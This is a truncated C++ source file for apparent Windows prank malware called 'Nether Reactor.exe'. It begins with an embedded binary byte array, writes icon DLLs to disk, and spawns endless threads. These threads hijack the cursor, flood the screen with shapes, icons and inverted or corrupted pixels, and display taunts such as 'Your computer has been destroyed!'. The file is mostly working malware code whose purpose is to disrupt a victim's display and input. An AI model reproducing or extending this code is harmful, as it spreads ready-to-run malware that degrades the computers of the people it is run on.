1\x0B\xC0\x03\x40\x54\xC0\x08\x0C\xC0\x03\x2D\xC0\x08\x08\x80\x11\x04\x40\x01\x04\xE2\x18\x81\x22\x22\x1E\x40\x10\x08\x86\x16\x86\x2A\x2A\x22\x35\x35\x9E\x9E\x40\x67\x40\x10\x41\x40\x40\x01\x04\xB3\x0D\x04\xBC\x0D\x81\x9B\x9B\x40\x55\xC0\x0D\x81\x99\x99\x06\xB8\x0D\x81\x9D\x9D\x33\xC0\x0D\x0A\x00\x14\x85\x47\x47\x9E\x9E\xEF\xEF\x09\x00\x14\x87\x2E\x2E\xF6\xF6\x3F\x3F\x3F\x3F\x04\x04\x00\x82\x3F\x3F\x3F\x04\x3E\x01\x81\x35\x35\x04\x04\x14\x04\x13\x28\x86\xDD\xDD\xEF\xDD\xDD\x44\x44\x40\x63\x00\x14\x41\x40\x40\x01\x08\x40\x01\x40\x5D\xC0\x12\x0C\xC2\x12\x2F\xC0\x12\x0A\x00\x19\x85\x4D\x4D\x5E\x5E\x1D\x1D\x1A\x00\x19\x08\x80\x16\x81\x18\x18\x04\x00\x19\x80\x1D\x04\x3E\x01\x41\x40\x40\x01\x41\x03\xC0\x17\x10\x00\x1E\x80\x22\x04\xED\x2C\x06\xC6\x08\x81\x3F\x3F\x0B\x00\x1E\x04\xBE\x08\x04\xC0\x03\x06\x40\x01\x40\x68\x00\x1E\x40\x60\x40\x1A\x81\x02\x02\x40\x44\x40\x1A\x83\x4D\x4D\x4D\x4D\x04\x1C\x2E\x04\x86\x07\x05\x85\x16\x04\x42\x01\x04\x06\x05\x81\x35\x35\x04\x04\x00\x07\x07\x00\x06\xA0\x07\x04\x1B\x00\x40\x5B\xC0\x21\x41\x40\x40\x01\x40\xB5\x40\x1F\x85\x5E\x5E\x5E\x5E\x5E\x5E\x06\x40\x01\x84\xDD\xDD\xDD\x75\x75\x06\x8B\x0C\x0F\xC0\x26\x06\x78\x16\x08\xC0\x26\x80\x5E\x06\xD1\x35\x40\x4E\xC0\x26\x41\x40\x40\x01\x40\xB7\x40\x24\x85\xA9\xA9\x7D\x7D\xA9\xA9\x06\x40\x01\x84\x75\x75\x75\x75\x75\x04\xAB\x03\x15\xC0\x2B\x06\xC4\x2B\x07\xC0\x2B\x06\xFA\x13\x41\x40\x40\x01\x40\xFF\x80\x2A\x04\xF7\x00\x85\x5B\x5B\x5B\x5B\xA6\xA6\x06\xC0\x30\x84\x5D\x5D\x5D\x5D\x5D\x06\xCB\x21\x04\x06\x0A\x04\x93\x1B\x80\x18\x06\x9A\x1B\x83\xDD\xDD\x47\x47\x04\xA4\x0C\x8E\x8D\x8D\x47\x47\x1D\x1D\x5E\x7D\x7D\xA6\xA6\x43\x43\xA7\xA7\x40\x4C\xC0\x30\x41\x40\x40\x01\x40\xB3\x40\x2E\x04\xF7\x00\x85\x97\x97\x5A\x5A\x3C\x3C\x0B\xC0\x35\x04\x8B\x0C\x06\xC0\x35\x04\xCE\x08\x80\x33\x06\x9A\x20\x81\x47\x47\x04\xCF\x3A\x06\x66\x01\x88\x4D\x4D\x5E\xA9\xA9\x8C\x8C\x5A\x5A\x0E\x19\x46\x41\x40\x40\x01\x40\xF3\x40\x33\x08\xBC\x3F\x83\x36\x36\x5D\x5D\x04\xC2\x3A\x0B\xC0\x3A\x81\x2A\x2A\x0F\xC0\x03\x06\x46\x3D\x81\x1D\x1D\x04\x3B\x0B\x84\x7D\x40\x40\x5B\x5B\x0E\x3E\x38\x41\x40\x40\x01\x40\xF5\x40\x38\x0A\x01\x3D\x83\x54\x54\x5B\x5B\x0D\xC0\x3F\x08\x2D\x38\x07\x07\x00\x04\xBC\x03\x81\x1D\x1D\x04\xDD\x03\x88\x40\x40\xA6\xA6\x3C\x8C\x8C\x3C\x3C\x10\x0E\x4B\x41\x40\x40\x01\x40\xF3\x40\x3D\x0C\xD6\x4A\x0F\xC0\x44\x0A\x0A\x00\x0B\x0B\x00\x04\x5B\x06\x83\x7D\x7D\x5B\x5B\x05\x74\x1B\x41\x40\x40\x01\x40\x49\x40\x01\x40\xBA\x40\x42\x04\xF7\x41\x0C\x80\x48\x84\xE5\x40\x40\x40\x40\x04\x04\x00\x04\x9E\x0D\x81\x1B\x1B\x04\x2F\x06\x82\x1D\x1D\x31\x04\x5C\x06\x04\x5E\x06\x81\x40\x40\x04\xEA\x0D\x84\x40\x40\xA7\xA7\x5A\x0C\x40\x47\x40\xFB\x80\x43\x40\x82\x40\x01\x40\xBC\x40\x47\x85\xA0\xA0\x45\x45\xA3\xA3\x0C\x07\x01\x82\x3C\x3C\x3C\x04\x7A\x4D\x81\x43\x43\x04\x04\x00\x8A\xC3\xC3\xA6\xA6\x7D\x7D\x7D\x7D\xF7\x28\x28\x08\x13\x00\x87\x36\x36\x3C\x3C\x3C\x3C\x3B\x3B\x05\xF7\x44\x41\x01\x80\x48\x40\x86\x40\x01\x40\xC6\x40\x4C\x06\x06\x00\x80\x4E\x04\x8E\x12\x04\x12\x10\x04\x04\x00\x83\x5A\x5A\x5B\x5B\x04\xB1\x03\x82\xA6\xF5\xF5\x08\x13\x00\x04\xEC\x44\x04\x74\x42\x82\x8E\xF8\xF8\x0C\x40\x01\x39\x40\x4C\x40\xCC\xC0\x4E\x04\x04\x00\x80\x3B\x0A\xCE\x18\x04\x19\x0F\x81\x54\x54\x04\xF3\x04\x80\xA6\x0A\x6D\x07\x04\x42\x01\x04\x44\x01\x0B\x40\x01\x41\x09\x00\x50\x40\x74\x40\x01\x40\xD0\xC0\x53\x11\xA0\x58\x05\xAF\x53\x12\x19\x00\x07\xF4\x13\x41\x11\x00\x55\x40\x70\x40\x01\x40\xD0\xC0\x58\x17\x28\x5B\x18\x18\x00\x0F\xC0\x58\x83\x92\x92\x92\x92\x40\xFE\x00\x5A\x40\x70\x40\x01\x40\xDB\xC0\x5D\x41\x40\x40\x01\x40\x67\x40\x01\x40\xDF\xC0\x62\x1B\xBB\x62\x0B\xC0\x62\x07\x40\x65\x41\x13\x00\x64\x40\x5F\x40\x01\x40\xE1\xC0\x67\x20\xBC\x67\x06\x40\x01\x85\x5C\x5C\xFD\xFD\xFD\xFD\x41\x14\x00\x69\x40\x5F\x40\x01\x41\x07\xC0\x6C\x83\xFC\xFC\xC1\xC1\x41\x3C\x00\x6E\x39\x40\x01\x4F\x7F\xFF\x7F\x4A\xEF\xEF\x0A\x81\x05\x05\x07\x07\x00\x1C\x1E\x00\x25\x48\x00\x81\x05\x05\x04\x04\x00\x41\x40\x40\x01\x40\xF2\x40\x01\x05\xF3\x00\x11\xF9\x00\x17\x17\x00\x20\x88\x01\x29\x32\x00\x40\xC8\x6A\x01\x41\x40\x40\x01\x81\x05\x05\x05\xCB\x00\x08\x2F\x01\x08\x83\x03\x07\x09\x00\x06\x1B\x00\x09\xE4\x03\x0A\x1E\x00\x0B\x17\x00\x13\xC0\x03\x0C\xCB\x03\x15\x17\x00\x0E\x68\x00\x0C\x54\x00\x10\x52\x00\x11\x9B\x01\x40\x8F\x27\x04\x07\xA2\x00\x0A\x44\x01\x09\x13\x00\x08\xAD\x00\x09\xDD\x00\x0A\x1E\x00\x0C\x17\x00\x12\x80\x02\x14\x8B\x02\x10\x5F\x00\x0C\x65\x00\x0D\x54\x00\x10\x3D\x00\x09\x15\x00\x0E\x72\x00\x40\x89\x41\x01\x41\x40\x40\x01\x0B\x80\x07\x08\x83\x03\x0D\x40\x01\x0E\xE1\x00\x0B\xD7\x03\x1A\x00\x05\x0D\x48\x00\x08\x0E\x00\x10\x35\x00\x13\x40\x01\x15\xD0\x07\x0F\x20\x08\x0E\x16\x00\x41\x40\x40\x01\x40\x90\x40\x01\x19\x80\x07\x0B\xC0\x03\x17\x3D\x07\x13\xC0\x03\x0F\x70\x03\x21\xC0\x03\x1A\xA0\x07\x12\xC0\x03\x40\x94\x40\x0B\x41\x40\x40\x01\x11\x85\x08\x11\xC6\x05\x26\xC0\x03\x0E\x48\x00\x11\xCB\x03\x0B\x53\x06\x10\xC0\x08\x0F\xBC\x01\x07\x1D\x00\x14\xC0\x08\x40\x94\xC0\x03\x41\x35\x40\x01\x5A\x96\xD6\x2A\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"

int red, green, blue;
bool ifcolorblue = false, ifblue = false;
COLORREF fe(int length) {
	if (red != length) {
		red < length; red++;
		if (ifblue == true) {
			return RGB(red, 0, length);
		}
		else {
			return RGB(red, 0, 0);
		}
	}
	else {
		if (green != length) {
			green < length; green++;
			return RGB(length, green, 0);
		}
		else {
			if (blue != length) {
				blue < length; blue++;
				return RGB(0, length, blue);
			}
			else {
				red = 0; green = 0; blue = 0;
				ifblue = true;
			}
		}
	}
}

typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE r;
		BYTE g;
		BYTE b;
		BYTE Reserved;
	};
}_RGBQUAD, * PRGBQUAD;

int random() {
	if (prov == NULL)
		if (!CryptAcquireContext(&prov, NULL, NULL, PROV_RSA_FULL, CRYPT_SILENT | CRYPT_VERIFYCONTEXT))
			ExitProcess(1);

	int out;
	CryptGenRandom(prov, sizeof(out), (BYTE*)(&out));
	return out & 0x7fffffff;
}

void icondll(int code) {
	ofstream ofs;
	ofs.open("NETHERREACTORICON.dll", ios_base::out | ios_base::binary);
	ofs.write((char*)NETHERREACTORICON, sizeof(NETHERREACTORICON));
	ofs.close();
}

void icon2kdll(int code) {
	ofstream ofs;
	ofs.open("NETHERREACTORICON2K.dll", ios_base::out | ios_base::binary);
	ofs.write((char*)NETHERREACTORICON2K, sizeof(NETHERREACTORICON2K));
	ofs.close();
}

DWORD WINAPI chouchu(LPVOID lpParam) {
	POINT cursor;
	for (;;) {
		HDC hdc = GetDC(HWND_DESKTOP);
		int icon_x = GetSystemMetrics(SM_CXICON);
		int icon_y = GetSystemMetrics(SM_CYICON);
		GetCursorPos(&cursor);
		int X = cursor.x + rand() % 3 - 1;
		int Y = cursor.y + rand() % 3 - 1;
		SetCursorPos(X, Y);
		ReleaseDC(0, hdc);
	}
	return(0);
}

DWORD WINAPI drawnetherreactoricon(LPVOID lpParam) {
	HWND hwnd = GetDesktopWindow();
	HINSTANCE XUGEICON = LoadLibrary(_T("NETHERREACTORICON.dll"));
	HDC hdc = GetWindowDC(hwnd);
	POINT point;
	for (;;)
	{
		GetCursorPos(&point);
		DrawIcon(hdc, point.x + 0, point.y + 0, LoadIcon(XUGEICON, MAKEINTRESOURCE(rand() % 256)));

	}
}

DWORD WINAPI drawnetherreactoricon2k(LPVOID lpParam) {
	HWND hwnd = GetDesktopWindow();
	HINSTANCE XUGEICON2K = LoadLibrary(_T("NETHERREACTORICON2K.dll"));
	HDC hdc = GetWindowDC(hwnd);
	POINT point;
	for (;;)
	{
		GetCursorPos(&point);
		DrawIcon(hdc, point.x + 0, point.y + 0, LoadIcon(XUGEICON2K, MAKEINTRESOURCE(rand() % 256)));

	}
}

DWORD WINAPI mypayload1(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	int sw = GetSystemMetrics(SM_CXSCREEN);
	int sh = GetSystemMetrics(SM_CYSCREEN);
	for (;;) {
		HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		POINT p[4] = { rand() % sw, rand() % sh, rand() % sw, rand() % sh, rand() % sw, rand() % sh, rand() % sw, rand() % sh };
		SelectObject(hdc, brush);
		Chord(hdc, rand() % sw, rand() % sh, rand() % sw, rand() % sh, rand() % sw, rand() % sh, rand() % sw, rand() % sh);
		Pie(hdc, rand() % sw, rand() % sh, rand() % sw, rand() % sh, rand() % sw, rand() % sh, rand() % sw, rand() % sh);
		Sleep(50);
	}
	return 0;
}

DWORD WINAPI mypayload1b(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	int sw = GetSystemMetrics(SM_CXSCREEN);
	int sh = GetSystemMetrics(SM_CYSCREEN);
	for (;;) {
		HDC hdc = GetDC(0);
		POINT p[4] = { rand() % sw, rand() % sh, rand() % sw, rand() % sh, rand() % sw, rand() % sh, rand() % sw, rand() % sh };
		HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		HPEN hPen = CreatePen(PS_SOLID, 5, fe(255));
		SelectObject(hdc, hPen);
		PolyBezier(hdc, p, 4);
		DeleteObject(hPen);
		ReleaseDC(0, hdc);
		Sleep(50);
	}
}

DWORD WINAPI mypayload1c(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), x;
	for (;;) {
		hdc = GetDC(0);
		SelectObject(hdc, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
		x = rand() % w;
		BitBlt(hdc, x, 0, 10, h, hdc, x, 0, PATINVERT);
		Sleep(20);
	}
}

DWORD WINAPI drawshell32icon(LPVOID lpParam) {
	HWND hwnd = GetDesktopWindow();
	HINSTANCE HSHELL32 = LoadLibrary(_T("shell32.dll"));
	HDC hdc = GetWindowDC(hwnd);
	int sw = GetSystemMetrics(SM_CXSCREEN);
	int sh = GetSystemMetrics(SM_CYSCREEN);
	for (;;) {
		for (int x = 0; x <= sw; x += 32) {
			for (int y = 0; y <= sh; y += 32) {
				DrawIcon(hdc, x, y, LoadIcon(HSHELL32, MAKEINTRESOURCE(rand() % 256)));
			}
		}
		Sleep(1000);
	}
	return 0;
}

DWORD WINAPI mypayload2(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	int sw = GetSystemMetrics(SM_CXSCREEN);
	int sh = GetSystemMetrics(SM_CYSCREEN);
	for (;;) {
		HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		SelectObject(hdc, brush);
		POINT p[4] = { rand() % sw, rand() % sh, rand() % sw, rand() % sh, rand() % sw, rand() % sh, rand() % sw, rand() % sh };
		Polygon(hdc, p, 4);
		Polygon(hdc, p, 3);
		Polygon(hdc, p, 2);
		Sleep(50);
	}
	return 0;
}

DWORD WINAPI mypayload2b(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	int sw = GetSystemMetrics(SM_CXSCREEN);
	int sh = GetSystemMetrics(SM_CYSCREEN);
	for (;;) {
		HDC hdc = GetDC(0);
		POINT p[4] = { rand() % sw, rand() % sh, rand() % sw, rand() % sh, rand() % sw, rand() % sh, rand() % sw, rand() % sh };
		HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		HPEN hPen = CreatePen(PS_SOLID, 5, fe(255));
		SelectObject(hdc, hPen);
		Polyline(hdc, p, 4);
		DeleteObject(hPen);
		ReleaseDC(0, hdc);
		Sleep(50);
	}
}

DWORD WINAPI mypayload2c(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(0), y, h = GetSystemMetrics(1), x;
	for (;;) {
		hdc = GetDC(0);
		y = rand() % h;
		BitBlt(hdc, 0, y, w, 10, hdc, 0, y, NOTSRCCOPY);
		Sleep(20);
	}
}

DWORD WINAPI mypayload5(LPVOID lpParam) {
	int dwStartTime = time(NULL);
	for (;;) {
		int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
		HDC hdc = GetDC(NULL);
		HDC hcdc = CreateCompatibleDC(hdc);
		HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		SetBkMode(hcdc, 1);
		LPCSTR text[5] = { "Nether Reactor.exe", "XUGE", "Your computer has been destroyed!", "Haha!", "Still using this conputer?" };
		int tmp = rand() % 5;
		SetTextColor(hcdc, RGB(rand() % 255, rand() % 255, rand() % 255));
		HFONT font = CreateFont(40, 20, 0, 0, FW_NORMAL, 0, 0, 0, ANSI_CHARSET, OUT_CHARACTER_PRECIS, CLIP_CHARACTER_PRECIS, DEFAULT_QUALITY, FF_DONTCARE, L"114514");
		SelectObject(hcdc, font);
		TextOutA(hcdc, rand() % w, rand() % h, text[tmp], strlen(text[tmp]));
		BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdc);
		ReleaseDC(NULL, hcdc);
		DeleteObject(font);
		DeleteObject(hdc);
		DeleteObject(hcdc);
		DeleteObject(hBitmap);
		Sleep(5);
	}
	RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
	return 0;
}

DWORD WINAPI drawbignetherreactoricon(LPVOID lpParam) {
	HWND hwnd = GetDesktopWindow();
	HDC hdc = GetWindowDC(hwnd);
	HINSTANCE NETHERREACTORICON = LoadLibrary(_T("NETHERREACTORICON.dll"));
	for (;;)
	{

		DrawIconEx(hdc, random() % GetSystemMetrics(0), random() % GetSystemMetrics(1), LoadIconW(NETHERREACTORICON, MAKEINTRESOURCE(rand() % 256)), random() % GetSystemMetrics(0), random() % GetSystemMetrics(1), NULL, NULL, DI_NORMAL);
		Sleep(25);
	}
}

DWORD WINAPI drawbignetherreactoricon2k(LPVOID lpParam) {
	HWND hwnd = GetDesktopWindow();
	HDC hdc = GetWindowDC(hwnd);
	HINSTANCE NETHERREACTORICON2K = LoadLibrary(_T("NETHERREACTORICON2K.dll"));
	for (;;)
	{

		DrawIconEx(hdc, random() % GetSystemMetrics(0), random() % GetSystemMetrics(1), LoadIconW(NETHERREACTORICON2K, MAKEINTRESOURCE(rand() % 256)), random() % GetSystemMetrics(0), random() % GetSystemMetrics(1), NULL, NULL, DI_NORMAL);
		Sleep(25);
	}
}

DWORD WINAPI mypayload6(LPVOID lpParam) {
	HINSTANCE HSHELL32 = LoadLibrary(_T("shell32.dll"));
	int dwStartTime = time(NULL);
	int status = 3;
	int icnNum = 32516;
	POINT p;
	p.x = 0, p.y = 0;
	for (;;) {
		int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
		HDC hdc = GetDC(NULL);
		DrawIconEx(hdc, p.x, p.y, LoadIconW(HSHELL32, MAKEINTRESOURCE(rand() % 256)), 96, 96, NULL, NULL, DI_NORMAL);
		switch (status) {
		case 0: //↖
			icnNum = 32513;
			p.x -= 20;
			p.y -= 20;
			if (p.x < 0 || p.y < 0) {
				if (p.x < 0) {
					status = 1;
				}
				if (p.y < 0) {
					status = 2;
				}
			}
			break;
		case 1: //↗
			icnNum = 32514;
			p.x += 20;
			p.y -= 20;
			if (p.x >= w - 20 || p.y < 0) {
				if (p.x >= w - 20) {
					status = 0;
				}
				if (p.y < 0) {
					status = 3;
				}
			}
			break;
		case 2: //↙
			icnNum = 32515;
			p.x -= 20;
			p.y += 20;
			if (p.x < 0 || p.y >= h - 20) {
				if (p.x < 0) {
					status = 3;
				}
				if (p.y >= h - 20) {
					status = 0;
				}
			}
			break;
		case 3: //↘
			icnNum = 32516;
			if (p.x >= w - 20 && p.y >= h - 20) {
				RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
				return 0;
			}
			p.x += 20;
			p.y += 20;
			if (p.x >= w - 20 || p.y >= h - 20) {
				if (p.x >= w - 20) {
					status = 2;
				}
				if (p.y >= h - 20) {
					status = 1;
				}
			}
			break;
		}
		Sleep(10);
	}
}

DWORD WINAPI copycur(LPVOID lpParam) {
	int dwStartTime = time(NULL);
	int status = 3;
	int icnNum = 32516;
	POINT p;
	p.x = 0, p.y = 0;
	for (;;) {
		int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
		HDC hdc = GetDC(NULL);
		DrawIcon(hdc, p.x, p.y, LoadCursor(0, IDC_ARROW));
		switch (status) {
		case 0: //↖
			icnNum = 32513;
			p.x -= 5;
			p.y -= 5;
			if (p.x < 0 || p.y < 0) {
				if (p.x < 0) {
					status = 1;
				}
				if (p.y < 0) {
					status = 2;
				}
			}
			break;
		case 1: //↗
			icnNum = 32514;
			p.x += 5;
			p.y -= 5;
			if (p.x >= w - 5 || p.y < 0) {
				if (p.x >= w - 2) {
					status = 0;
				}
				if (p.y < 0) {
					status = 3;
				}
			}
			break;
		case 2: //↙
			icnNum = 32515;
			p.x -= 5;
			p.y += 5;
			if (p.x < 0 || p.y >= h - 5) {
				if (p.x < 0) {
					status = 3;
				}
				if (p.y >= h - 2) {
					status = 0;
				}
			}
			break;
		case 3: //↘
			icnNum = 32516;
			if (p.x >= w - 5 && p.y >= h - 5) {
				RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
				return 0;
			}
			p.x += 5;
			p.y += 5;
			if (p.x >= w - 5 || p.y >= h - 5) {
				if (p.x >= w - 5) {
					status = 2;
				}
				if (p.y >= h - 5) {
					status = 1;
				}
			}
			break;
		}
		Sleep(10);
	}
}

DWORD WINAPI drawcur(LPVOID lpParam) {
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);
	HWND hwnd = GetDesktopWindow();
	HDC hdc = GetWindowDC(hwnd);
	while (1) {
		DrawIcon(hdc, random() % w, random() % h, LoadCursor(0, IDC_WAIT));
		DrawIcon(hdc, random() % w, random() % h, LoadCursor(0, IDC_IBEAM));
		DrawIcon(hdc, random() % w, random() % h, LoadCursor(0, IDC_CROSS));
		DrawIcon(hdc, random() % w, random() % h, LoadCursor(0, IDC_UPARROW));
		DrawIcon(hdc, random() % w, random() % h, LoadCursor(0, IDC_SIZENWSE));
		DrawIcon(hdc, random() % w, random() % h, LoadCursor(0, IDC_SIZENESW));
		DrawIcon(hdc, random() % w, random() % h, LoadCursor(0, IDC_SIZEWE));
		DrawIcon(hdc, random() % w, random() % h, LoadCursor(0, IDC_SIZENS));
		DrawIcon(hdc, random() % w, random() % h, LoadCursor(0, IDC_SIZEALL));
		DrawIcon(hdc, random() % w, random() % h, LoadCursor(0, IDC_NO));
		DrawIcon(hdc, random() % w, random() % h, LoadCursor(0, IDC_HAND));
		DrawIcon(hdc, random() % w, random() % h, LoadCursor(0, IDC_APPSTARTING));
		DrawIcon(hdc, random() % w, random() % h, LoadCursor(0, IDC_HELP));
		Sleep(10);
	}

}

VOID WINAPI ci(int x, int y, int w, int h)
{
	HDC hdc = GetDC(0);
	HRGN hrgn = CreateEllipticRgn(x, y, w + x, h + y);
	SelectClipRgn(hdc, hrgn);
	BitBlt(hdc, x, y, w, h, hdc, x, y, NOTSRCCOPY);
	DeleteObject(hrgn);
	ReleaseDC(NULL, hdc);
}

VOID WINAPI ci2(int x, int y, int w, int h)
{
	HDC hdc = GetDC(0);
	HRGN hrgn = CreateEllipticRgn(x, y, w + x, h + y);
	BitBlt(hdc, x, y, w, h, hdc, x, y, NOTSRCCOPY);
	ReleaseDC(NULL, hdc);
}

VOID WINAPI ci3(int x, int y, int w, int h)
{
	HDC hdc = GetDC(0);
	HRGN hrgn = CreateEllipticRgn(x, y, w + x, h + y);
	SelectClipRgn(hdc, hrgn);
	SelectObject(hdc, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
	BitBlt(hdc, x, y, w, h, hdc, x, y, PATINVERT);
	DeleteObject(hrgn);
	ReleaseDC(NULL, hdc);
}

VOID WINAPI ci4(int x, int y, int w, int h)
{
	HDC hdc = GetDC(0);
	HRGN hrgn = CreateEllipticRgn(x, y, w + x, h + y);
	SelectObject(hdc, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
	BitBlt(hdc, x, y, w, h, hdc, x, y, PATINVERT);
	ReleaseDC(NULL, hdc);
}

DWORD WINAPI fanseyuan(LPVOID lpParam) {
	RECT rect;
	GetWindowRect(GetDesktopWindow(), &rect);
	int w = rect.right - rect.left - 500, h = rect.bottom - rect.top - 500;

	for (int t = 0;; t++)
	{
		const int size = 1000;
		int x = rand() % (w + size) - size / 2, y = rand() % (h + size) - size / 2;

		for (int i = 0; i < size; i += 100)
		{
			ci(x - i / 2, y - i / 2, i, i);
			Sleep(25);
		}
	}
}

DWORD WINAPI fansefangxing(LPVOID lpParam) {
	RECT rect;
	GetWindowRect(GetDesktopWindow(), &rect);
	HDC hdc = GetDC(0);
	int w = rect.right - rect.left - 500, h = rect.bottom - rect.top - 500;
	for (int t = 0;; t++)
	{
		const int size = 1000;
		int x = rand() % (w + size) - size / 2, y = rand() % (h + size) - size / 2;
		for (int i = 0; i < size; i += 100)
		{
			ci2(x - i / 2, y - i / 2, i, i);
			Sleep(25);
		}
	}
}

DWORD WINAPI coloryuan(LPVOID lpParam) {
	RECT rect;
	GetWindowRect(GetDesktopWindow(), &rect);
	int w = rect.right - rect.left - 500, h = rect.bottom - rect.top - 500;

	for (int t = 0;; t++)
	{
		const int size = 1000;
		int x = rand() % (w + size) - size / 2, y = rand() % (h + size) - size / 2;

		for (int i = 0; i < size; i += 100)
		{
			ci3(x - i / 2, y - i / 2, i, i);
			Sleep(25);
		}
	}
}

DWORD WINAPI colorfangxing(LPVOID lpParam) {
	RECT rect;
	GetWindowRect(GetDesktopWindow(), &rect);
	int w = rect.right - rect.left - 500, h = rect.bottom - rect.top - 500;

	for (int t = 0;; t++)
	{
		const int size = 1000;
		int x = rand() % (w + size) - size / 2, y = rand() % (h + size) - size / 2;

		for (int i = 0; i < size; i += 100)
		{
			ci4(x - i / 2, y - i / 2, i, i);
			Sleep(25);
		}
	}
}

DWORD WINAPI rgb(LPVOID lpParam) {
	HWND v3;
	HBITMAP h;
	HDC hdcSrc;
	HDC hdc;
	void* lpvBits;
	int nHeight;
	int nWidth;
	DWORD v12;
	int j;
	int v14;
	int i;
	v12 = GetTickCount();
	nWidth = GetSystemMetrics(0);
	nHeight = GetSystemMetrics(1);
	lpvBits = VirtualAlloc(0, 4 * nWidth * (nHeight + 1), 0x3000u, 4u);
	for (i = 0; ; i = (i + 1) % 2)
	{
		hdc = GetDC(0);
		hdcSrc = CreateCompatibleDC(hdc);
		h = CreateBitmap(nWidth, nHeight, 1u, 0x20u, lpvBits);
		SelectObject(hdcSrc, h);
		BitBlt(hdcSrc, 0, 0, nWidth, nHeight, hdc, 0, 0, SRCCOPY);
		GetBitmapBits(h, 4 * nHeight * nWidth, lpvBits);
		v14 = 0;
		if (GetTickCount() - v12 > 0xA)
			rand();
		for (j = 0; nHeight * nWidth > j; ++j)
		{
			if (!(j % nHeight) && !(rand() % 110))
				v14 = rand() % 24;
			*((BYTE*)lpvBits + 4 * j + v14) -= 5;
		}
		SetBitmapBits(h, 4 * nHeight * nWidth, lpvBits);
		BitBlt(hdc, 0, 0, nWidth, nHeight, hdcSrc, 0, 0, SRCCOPY);
		DeleteObject(h);
		DeleteObject(hdcSrc);
		DeleteObject(hdc);
	}
}

DWORD WINAPI mypayload7(LPVOID lpParam) {
	HINSTANCE NETHERREACTORICON = LoadLibrary(_T("NETHERREACTORICON.dll"));
	int dwStartTime = time(NULL);
	int status = 3;
	int icnNum = 32516;
	POINT p;
	p.x = 0, p.y = 0;
	for (;;) {
		int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
		HDC hdc = GetDC(NULL);
